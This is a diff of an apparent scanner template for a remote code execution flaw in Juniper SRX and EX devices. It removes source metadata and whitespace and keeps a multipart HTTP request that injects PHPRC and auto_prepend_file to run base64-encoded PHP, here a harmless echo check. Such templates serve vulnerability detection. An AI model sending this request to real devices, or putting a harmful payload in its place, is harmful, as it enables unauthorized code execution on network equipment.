@@ -3,12 +3,8 @@ info:
   name: Juniper SRX防火墙和EX交换机远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/em4yghykv2zzkp0n'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: em4yghykv2zzkp0n
-    fofa: 暂无
 http:
 - raw:
   - 'POST / HTTP/1.1
@@ -20,14 +16,10 @@ http:
     Content-Type: multipart/form-data; boundary=------------------------d243ab87a113ee7a
 
 
-
-
     --------------------------d243ab87a113ee7a
 
 
     Content-Disposition: form-data; name="allow_url_include"
-
-
 
 
     1
@@ -39,8 +31,6 @@ http:
     Content-Disposition: form-data; name="auto_prepend_file"
 
 
-
-
     "data://text/plain;base64,PD8gZWNobyAnQ1ZFLTIwMjMtMzY4NDUnOyA/Pg=="
 
 
@@ -48,8 +38,6 @@ http:
 
 
     Content-Disposition: form-data; name="PHPRC"
-
-
 
 
     /dev/fd/0
